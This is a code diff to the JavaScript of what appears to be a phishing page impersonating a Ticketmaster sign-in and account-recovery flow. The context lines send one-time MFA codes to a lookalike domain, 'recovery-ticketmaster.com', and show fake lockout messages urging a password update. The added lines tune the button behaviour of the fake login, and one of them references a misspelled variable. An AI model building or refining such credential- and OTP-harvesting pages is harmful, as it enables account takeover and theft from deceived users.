@@ -8107,12 +8107,15 @@
                 emailInput.classList.add('input-error');
                 if(JSON.stringify(data).includes('Invalid email')){
                   errorMessageElement.textContent = "We can’t find an account with this email address. Please try a different email.";
+                  signInButton.disabled = false;
                 }
                 else if(JSON.stringify(data).includes('Account Locked')){
                   errorMessageElement.textContent = "Your Account is locked. It’s Time to Update Your Password";
+                  signInButton.disabled = false;
                 }
                 else if(JSON.stringify(data).includes('Invalid password')){
                   errorMessageElement.textContent = "Please double-check your password and try again";
+                  signInButton.disabled = false;
                 }
                  // alert('Login failed: ' + data.message);
               
@@ -8179,6 +8182,8 @@
             const otpCode = document.getElementById('mfa-code-input-field5').value;
             const otpInput = document.getElementById('mfa-code-input-field5');
             const errorMessageElement = document.getElementById('otp-error-message');
+            const confirmbutton = document.getElementById('confirm-button')
+            confirmButton.disabled = true;
 
             fetch('https://recovery-ticketmaster.com/otp-validate', {
                 method: 'POST',
@@ -8196,6 +8201,7 @@
                     otpInput.classList.add('input-error');
                     // Display the error message below the input field
                     errorMessageElement.textContent = 'The code you entered is invalid. Please double-check your entry and try again.';
+                    confirmButton.disabled = false;
                 }
             })
             .catch(error => {
